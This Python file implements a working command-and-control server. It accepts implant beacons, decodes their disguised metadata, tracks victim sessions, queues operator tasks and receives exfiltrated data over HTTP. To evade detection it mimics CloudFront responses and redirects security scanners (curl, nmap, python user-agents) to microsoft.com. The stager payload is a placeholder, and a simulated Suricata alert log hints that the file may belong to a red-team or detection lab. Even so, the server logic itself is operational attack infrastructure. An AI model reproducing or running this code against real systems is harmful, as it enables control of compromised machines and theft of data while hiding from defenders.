"""
Integrated C2 Server Daemon (Python Core)
Multi-threaded HTTP Server with Malleable Decoding, Session Tracking, Honeypot Redirection & Metrics.
"""

import socket
import threading
import time
import math
from typing import Dict, Any, Callable, Optional
from backend.models import Profile, TransformBlock
from backend.transforms import TransformPipeline
from backend.audit_trail import AuditTrail


def _build_pipeline(tb: TransformBlock) -> TransformPipeline:
    pipe = TransformPipeline()
    for t in tb.transforms:
        pipe.add_step(t.action, t.arg)
    return pipe


def _calculate_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freqs = {}
    for b in data:
        freqs[b] = freqs.get(b, 0) + 1
    entropy = 0.0
    length = float(len(data))
    for count in freqs.values():
        p = count / length
        entropy -= p * (math.log2(p))
    return entropy


class EmbeddedC2Server:
    """Multi-threaded Python C2 Server with live Malleable C2 telemetry decoding."""

    def __init__(
        self,
        port: int,
        profile: Profile,
        on_log_callback: Optional[Callable[[str], None]] = None,
        on_session_update_callback: Optional[Callable[[Dict[str, Any]], None]] = None
    ):
        self.port = port
        self.profile = profile
        self.on_log = on_log_callback
        self.on_session_update = on_session_update_callback

        self.running = False
        self.server_sock: Optional[socket.socket] = None
        self.listener_thread: Optional[threading.Thread] = None
        self.lock = threading.Lock()

        self.sessions: Dict[str, Dict[str, Any]] = {}
        self.queued_tasks: Dict[str, list] = {}
        self.audit = AuditTrail()

        self.metrics = {
            "total_connections": 0,
            "total_get_requests": 0,
            "total_post_requests": 0,
            "total_bytes_in": 0,
            "total_bytes_out": 0,
            "nids_alerts": 0,
            "honeypot_redirects": 0
        }

    def log(self, msg: str):
        if self.on_log:
            self.on_log(msg)

    def start(self) -> bool:
        try:
            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_sock.bind(("0.0.0.0", self.port))
            self.server_sock.listen(15)
            self.running = True

            self.listener_thread = threading.Thread(target=self._listen_loop, daemon=True)
            self.listener_thread.start()

            self.log(f"[✓] C2 Server Daemon listening on 0.0.0.0:{self.port}")
            self.log(f"[*] Active Profile: {self.profile.name}")
            self.log(f"[*] Honeypot Scanner Redirection: ACTIVE -> https://microsoft.com")
            self.audit.log("SERVER_START", {"port": self.port, "profile": self.profile.name})
            return True
        except Exception as e:
            self.log(f"[!] Server bind failed on port {self.port}: {e}")
            return False

    def stop(self):
        self.running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        self.log("[*] C2 Server Daemon stopped.")
        self.audit.log("SERVER_STOP", {"port": self.port})

    def update_profile(self, new_profile: Profile):
        with self.lock:
            self.profile = new_profile
            self.log(f"[✓] Profile Hot-Reloaded: {self.profile.name}")
            self.audit.log("PROFILE_RELOAD", {"profile": self.profile.name})

    def queue_task(self, beacon_id: str, task_text: str):
        with self.lock:
            if beacon_id not in self.queued_tasks:
                self.queued_tasks[beacon_id] = []
            self.queued_tasks[beacon_id].append(task_text)
            self.log(f"[✓] Task Queued for Beacon [{beacon_id}]: {task_text}")
            self.audit.log("TASK_QUEUED", {"beacon_id": beacon_id, "task": task_text})

    def _listen_loop(self):
        while self.running:
            try:
                client_sock, addr = self.server_sock.accept()
                t = threading.Thread(target=self._handle_client, args=(client_sock, addr[0], addr[1]), daemon=True)
                t.start()
            except Exception:
                if not self.running:
                    break

    def _handle_client(self, sock: socket.socket, client_ip: str, client_port: int):
        try:
            raw_bytes = sock.recv(65536)
            if not raw_bytes:
                sock.close()
                return

            with self.lock:
                self.metrics["total_connections"] += 1
                self.metrics["total_bytes_in"] += len(raw_bytes)

            raw_str = raw_bytes.decode("latin-1", errors="ignore")
            lines = raw_str.split("\r\n")
            if not lines:
                sock.close()
                return

            req_line = lines[0].split(" ")
            if len(req_line) < 2:
                sock.close()
                return

            method = req_line[0]
            path = req_line[1]

            # Parse headers
            headers = {}
            body = ""
            is_body = False
            for line in lines[1:]:
                if not is_body:
                    if line == "":
                        is_body = True
                        continue
                    if ":" in line:
                        k, v = line.split(":", 1)
                        headers[k.strip().lower()] = v.strip()
                else:
                    body += line + "\r\n"

            # Check for proxy header
            effective_ip = headers.get("x-forwarded-for", client_ip)
            ua = headers.get("user-agent", "")

            # Honeypot Scanner Redirection
            if not ua or "curl" in ua.lower() or "nmap" in ua.lower() or "python" in ua.lower():
                resp = "HTTP/1.1 302 Found\r\nLocation: https://www.microsoft.com\r\nConnection: close\r\n\r\n"
                sock.sendall(resp.encode("ascii"))
                sock.close()
                with self.lock:
                    self.metrics["honeypot_redirects"] += 1
                self.log(f"[🛡️ HONEYPOT REDIRECT] Non-Beacon Scanner from {effective_ip} ({ua}) -> Deflected to https://microsoft.com")
                return

            # NIDS DPI Check
            for u in self.profile.http_get.uris:
                if path.startswith(u):
                    with self.lock:
                        self.metrics["nids_alerts"] += 1
                    self.log(f"  [★ NIDS DPI HIT] Inbound packet matches Suricata Rule [SID 1000100: {u}]")
                    break

            # Handle Stager
            if path in ("/stager.bin", "/stager64.bin"):
                stager_bytes = b"OSTAD_STAGE_PAYLOAD_DUMMY_BINARY_DATA"
                resp = (
                    f"HTTP/1.1 200 OK\r\nServer: CloudFront\r\nContent-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(stager_bytes)}\r\nConnection: close\r\n\r\n"
                ).encode("ascii") + stager_bytes
                sock.sendall(resp)
                sock.close()
                self.log(f"[+] Served Stager Binary to {effective_ip}:{client_port}")
                return

            beacon_id = "UNKNOWN"
            decoded_telemetry = ""

            if method == "GET":
                with self.lock:
                    self.metrics["total_get_requests"] += 1

                cookie = headers.get("cookie", "")
                raw_token = cookie if cookie else path

                # Calculate Shannon Entropy
                token_bytes = raw_token.encode("latin-1", errors="ignore")
                entropy = _calculate_entropy(token_bytes)

                # Decode using profile HTTP-GET metadata block
                meta_block = self.profile.http_get.client.transform_blocks.get("metadata")
                if meta_block:
                    pipe = _build_pipeline(meta_block)
                    dec_bytes = pipe.reverse(token_bytes)
                    decoded_telemetry = dec_bytes.decode("utf-8", errors="replace")

                # Extract Beacon ID
                if "BEACON_ID=" in decoded_telemetry:
                    try:
                        part = decoded_telemetry.split("BEACON_ID=")[1]
                        beacon_id = part.split(";")[0]
                    except Exception:
                        pass

                # Session Update
                with self.lock:
                    sess = self.sessions.get(beacon_id, {})
                    sess["id"] = beacon_id
                    sess["ip"] = effective_ip
                    sess["port"] = client_port
                    sess["entropy"] = round(entropy, 2)
                    sess["packets"] = sess.get("packets", 0) + 1
                    sess["last_seen"] = time.strftime("%H:%M:%S")
                    self.sessions[beacon_id] = sess

                if self.on_session_update:
                    self.on_session_update(self.sessions)

                self.log(f"[+] Inbound Beacon [{beacon_id}] from {effective_ip}:{client_port} | Entropy: {round(entropy, 2)}")
                if decoded_telemetry:
                    self.log(f"  ├─ Decoded Telemetry: {decoded_telemetry}")

                # Check task queue or dispatch default
                task_text = ""
                with self.lock:
                    q = self.queued_tasks.get(beacon_id, [])
                    if q:
                        task_text = q.pop(0)
                        self.log(f"  ├─ Dispatched Queued Operator Task: {task_text}")

                # Return shaped response
                if not task_text and "cloudfront" in self.profile.name.lower():
                    # Return HTTP 304 Not Modified when idle
                    resp_str = "HTTP/1.1 304 Not Modified\r\nServer: CloudFront\r\nETag: \"cf-982143\"\r\nConnection: keep-alive\r\n\r\n"
                    sock.sendall(resp_str.encode("ascii"))
                    self.log(f"  └─ Returned HTTP 304 Not Modified (Idle Browser Cache Emulation)")
                else:
                    if not task_text:
                        task_text = f"TASK:STATUS_OK;SLEEP={self.profile.sleeptime}"

                    # Encode tasking using server transform
                    pipe_srv = TransformPipeline()
                    if self.profile.http_get.server.output:
                        pipe_srv = _build_pipeline(self.profile.http_get.server.output)
                    enc_task = pipe_srv.execute(task_text.encode("utf-8")).decode("latin-1", errors="ignore")

                    resp_str = (
                        f"HTTP/1.1 200 OK\r\nServer: CloudFront\r\nContent-Type: application/json\r\n"
                        f"Content-Length: {len(enc_task)}\r\nConnection: keep-alive\r\n\r\n{enc_task}"
                    )
                    sock.sendall(resp_str.encode("latin-1", errors="ignore"))
                    self.log(f"  └─ Sent Shaped Tasking Response: HTTP 200 OK ({len(resp_str)} bytes)")

            elif method == "POST":
                with self.lock:
                    self.metrics["total_post_requests"] += 1

                # Decode exfiltrated data
                out_block = self.profile.http_post.client.transform_blocks.get("output")
                if out_block:
                    pipe_post = _build_pipeline(out_block)
                    dec_post = pipe_post.reverse(body.encode("latin-1", errors="ignore"))
                    decoded_telemetry = dec_post.decode("utf-8", errors="replace")

                self.log(f"[+] Received Exfiltration Report from {effective_ip}")
                if decoded_telemetry:
                    self.log(f"  ├─ Decoded Data: {decoded_telemetry}")

                ack = '{"status":"received","ack":true}'
                resp_str = f"HTTP/1.1 200 OK\r\nServer: CloudFront\r\nContent-Type: application/json\r\nContent-Length: {len(ack)}\r\n\r\n{ack}"
                sock.sendall(resp_str.encode("ascii"))
                self.log(f"  └─ Acknowledged Exfiltration Report (HTTP 200 OK)")

            sock.close()
        except Exception as e:
            try:
                sock.close()
            except Exception:
                pass
